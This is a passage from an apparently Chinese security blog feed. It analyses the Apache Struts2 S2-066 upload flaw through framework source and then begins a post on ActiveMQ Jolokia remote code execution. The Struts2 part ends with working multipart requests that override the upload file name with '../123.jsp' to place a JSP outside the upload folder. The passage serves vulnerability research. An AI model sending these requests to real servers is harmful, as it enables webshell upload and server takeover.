class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">getCanonicalName</span><span class="params">(<span class="keyword">final</span> String originalFileName)</span> </span>&#123;</span><br><span class="line">      String fileName = originalFileName;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> forwardSlash = fileName.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">int</span> backwardSlash = fileName.lastIndexOf(<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (forwardSlash != -<span class="number">1</span> &amp;&amp; forwardSlash &gt; backwardSlash) &#123;</span><br><span class="line">          fileName = fileName.substring(forwardSlash + <span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          fileName = fileName.substring(backwardSlash + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> fileName;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>继续回到FileUploadInterceptor当中，处理完文件后，会把一些信息保存到acceptedFiles/acceptedContentTypes/acceptedFileNames中，从下面的fileNameName也可以看出为什么我们的Action一定要那样命名上传的文件名<img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209195132672.png" alt="image-20231209195132672"></p><p>再往下将这些参数保存到了org.apache.struts2.dispatcher.HttpParameters对象当中<img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209195257512.png" alt="image-20231209195257512"></p><p>既然是保存到了HttpParameter参数中，结合Commit当中的一些讯息，接下来我们很容易有个思考，既然是HttpParameter，是不是存在其他传参的过程能够做变量覆盖</p><p>从上面的图片做深入分析,我们可以知道<code>ac.getParameters()</code>获取到的HttpParameter对象是从上下文获取的</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209201050657.png" alt="image-20231209201050657"></p><p>上下文的创建在<code>org.apache.struts2.dispatcher.Dispatcher#serviceAction</code></p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209201235178.png" alt="image-20231209201235178"></p><p>在创建上下文的过程当中我们发现，调用了<code>HttpParameters.create</code>将请求的参数保存到了当中</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209201416211.png" alt="image-20231209201416211"></p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209201621575.png" alt="image-20231209201621575"></p><p>看到这里其实我们也就可以知道大概思路了，参数的保存既然在FileUploadInterceptor之前，那么变量覆盖就不存在了(存储结构为Map，key唯一)，结合到commit当中的一些大小写，此时我们不难猜到如果我们将上传的文件名小写，那会不会在将参数绑定到Action对象的过程当中</p><p>而这部分处理过程就在<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</code></p><p>里面调用了<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>做参数绑定，这个过程老生常谈了，不懂得可以去百度了解了解这里不多谈了</p><p>当然这里还是需要多说一点，这个方法的调用是有顺序的，这和Map的存储结构有关</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209223129852.png" alt="image-20231209223129852"></p><p>这里可以看到是Treemap</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209224143508.png" alt="image-20231209224143508"></p><p>可以看到大写的会优先(Map结构)</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209223652846.png" alt="image-20231209223652846"></p><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>我第一次打的时候把最后一位大写了，但是发现没有调用到set方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 188</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1aaa</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;UPloadFileName&quot;; </span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1323.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>经过debug可以发现在<code>ognl.OgnlRuntime#_getSetMethod</code>获取setter方法时调用了<code>ognl.OgnlRuntime#getDeclaredMethods</code>做处理</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209221024596.png" alt="image-20231209221024596"></p><p>省略垃圾时间吧，最终在<code>ognl.OgnlRuntime#addIfAccessor</code>，可以看到必须满足<code>ms.endsWith(baseName)</code>(这点很关键，也就是说你的Action的程序代码怎么写影响你怎么写参数)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addIfAccessor</span><span class="params">(List result, Method method, String baseName, <span class="keyword">boolean</span> findSets)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String ms = method.getName();</span><br><span class="line">        <span class="keyword">if</span> (ms.endsWith(baseName)) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> isSet = <span class="keyword">false</span>, isIs = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span> ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX)</span><br><span class="line">                    || (isIs = ms.startsWith(IS_PREFIX))) &#123;</span><br><span class="line">                <span class="keyword">int</span> prefixLength = (isIs ? <span class="number">2</span> : <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">if</span> (isSet == findSets) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (baseName.length() == (ms.length() - prefixLength)) &#123;</span><br><span class="line">                        result.add(method);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">部分调用栈如下</span><br><span class="line">addIfAccessor:2701, OgnlRuntime (ognl)</span><br><span class="line">collectAccessors:2686, OgnlRuntime (ognl)</span><br><span class="line">getDeclaredMethods:2653, OgnlRuntime (ognl)</span><br><span class="line">_getSetMethod:2915, OgnlRuntime (ognl)</span><br><span class="line">getSetMethod:2884, OgnlRuntime (ognl)</span><br><span class="line">hasSetMethod:2955, OgnlRuntime (ognl)</span><br><span class="line">hasSetProperty:2973, OgnlRuntime (ognl)</span><br><span class="line">setProperty:83, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)</span><br><span class="line">setProperty:3359, OgnlRuntime (ognl)</span><br><span class="line">setValueBody:134, ASTProperty (ognl)</span><br><span class="line">evaluateSetValueBody:220, SimpleNode (ognl)</span><br><span class="line">setValue:308, SimpleNode (ognl)</span><br><span class="line">setValue:829, Ognl (ognl)</span><br><span class="line">lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">execute:-1, 102405086 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$53)</span><br><span class="line">compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>而baseName其实也是有做了处理的(必须看)，回到之前的<code>getDeclaredMethods</code>方法，我们的属性名会被<code>capitalizeBeanPropertyName</code>处理</p><p><img src="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/image-20231209222120653.png" alt="image-20231209222120653"></p><p>做了很多分支判断，可以看到特殊支持了一些特殊方法的调用，但是其实前面的几个不能用，因为他们后面多了一些字符<code>()</code>，在之前提到的endwith是不包括这些符号的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// don&#x27;t capitalize getters/setters</span></span><br><span class="line">        <span class="keyword">if</span> (propertyName.startsWith(GET_PREFIX) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Character.isUpperCase(propertyName.substring(<span class="number">3</span>,<span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">                <span class="keyword">return</span> propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (propertyName.startsWith(SET_PREFIX) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Character.isUpperCase(propertyName.substring(<span class="number">3</span>,<span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">                <span class="keyword">return</span> propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (propertyName.startsWith(IS_PREFIX) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Character.isUpperCase(propertyName.substring(<span class="number">2</span>,<span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">                <span class="keyword">return</span> propertyName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> first = propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> second = propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们主要关注下面的部分，如果属性第一个字符小写第二个大写直接返回，否则返回时将第一个字母大写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> first = propertyName.charAt(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> second = propertyName.charAt(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">    <span class="keyword">return</span> propertyName;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">    chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(chars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里的例子当中我们需要调用<code>com.struts2.UploadAction#setUploadFileName</code></p><p>因此也只能限制了我们的写法要么是<code>UploadFileName</code>要么是<code>uploadFileName</code>(前面提到的endwith+capitalizeBeanPropertyName处理)</p><h2 id="最终构造"><a href="#最终构造" class="headerlink" title="最终构造"></a>最终构造</h2><p>按照Map存储的调用顺序我们即可构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span>; filename=<span class="string">&quot;1.txt&quot;</span></span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1aaa</span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;uploadFileName&quot;</span>; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">../<span class="number">123.</span>jsp</span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.action?uploadFileName=../<span class="number">1234.</span>jsp HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 188</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1aaa</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某某通漏洞浅析</title>
      <link href="/2023/12/08/year/2023/12/%E6%9F%90%E6%9F%90%E9%80%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/12/08/year/2023/12/%E6%9F%90%E6%9F%90%E9%80%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="cfa8c91a53687e74f6ea0c0f34cdebe020fbeec5d6fd7762d1e00893e4fdddad"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法</title>
      <link href="/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/"/>
      <url>/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Apache-ActiveMQ-Jolokia远程代码执行不依赖JDK打法"><a href="#Apache-ActiveMQ-Jolokia远程代码执行不依赖JDK打法" class="headerlink" title="Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法"></a>Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法</h1><p>想着最近连写了几篇加密博客有点对不起看我博客的粉丝了，今天抽空简单分享一个姿势</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>大概测了一下</p><p>Apache ActiveMQ 5.16.x系列无log4j2的mbean</p><p>Apache ActiveMQ 5.17.x系列漏洞版本受影响</p><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>从网上已公开的打法可以知道使用<code>jdk.management.jfr:type=FlightRecorder</code>受jdk版本的影响，那有没有其他方法呢？答案肯定是有，从<a href="https://github.com/apache/activemq/commit/6120169e5">commit点我</a>可以看出禁用的mbean不仅有<code>jdk.management.jfr:type=FlightRecorder</code>,还有<code>com.sun.management:type=DiagnosticCommand</code>以及<code>org.apache.logging.log4j2:*</code>,对于DiagnosticCommand的利用在之前很早就有公开，链接在<a href="https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.md%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A4%A7%E6%A6%82%E7%9C%8B%E4%BA%86%E4%B8%80%E4%B8%8B%E8%BF%99%E9%87%8C%E4%BC%BC%E4%B9%8E%E4%B8%8D%E5%A4%AA%E8%A1%8C(%E4%B9%9F%E6%B2%A1%E4%BB%94%E7%BB%86%E7%9C%8B%E5%B0%B1%E6%98%AF%E4%BA%86)%EF%BC%8C%E6%AF%94%E8%BE%83%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E6%98%AF%E8%BF%99%E4%B8%AAlog4j2%E7%9A%84%E5%88%A9%E7%94%A8">https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.md，不过大概看了一下这里似乎不太行(也没仔细看就是了)，比较感兴趣的是这个log4j2的利用</a></p><p>在<a href="http://127.0.0.1:8161/api/jolokia/list%E5%BD%93%E4%B8%AD%E6%90%9C%E7%B4%A2%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%A6%82%E4%B8%8B%EF%BC%8C%E5%88%A9%E7%94%A8%E7%9A%84%E6%97%B6%E5%80%99%60type=63a65a25%60%E4%BC%BC%E4%B9%8E%E4%B8%8D%E6%98%AF%E5%9B%BA%E5%AE%9A%E7%9A%84%EF%BC%8C%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%A4%A7%E6%A6%82%E5%92%8C%E7%89%88%E6%9C%AC%E6%9C%89%E5%85%B3%EF%BC%8C%E9%9C%80%E8%A6%81%E5%85%88%E8%AE%BF%E9%97%AE%E8%BF%99%E4%B8%AA%E8%B7%AF%E7%94%B1%E7%9C%8B%E7%9C%8B">http://127.0.0.1:8161/api/jolokia/list当中搜索可以看到如下，利用的时候`type=63a65a25`似乎不是固定的，看起来大概和版本有关，需要先访问这个路由看看</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;org.apache.logging.log4j2&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;component=StatusLogger,type=63a65a25&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;attr&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;StatusDataHistory&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;[Ljava.lang.String;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute 